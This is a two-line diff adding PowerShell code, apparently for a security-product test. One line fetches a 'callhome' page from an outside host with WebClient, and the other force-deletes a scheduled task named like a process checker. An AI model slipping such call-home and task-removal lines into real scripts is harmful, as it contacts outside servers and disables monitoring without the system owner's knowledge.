@@ -1,0 +1,2 @@
+(new-object system.net.webclient).DownloadString('http://sophostest.com/callhome/index.html'); 
+Start-Process 'schtasks' -ArgumentList '/delete /tn SophossProcessChecker /F'
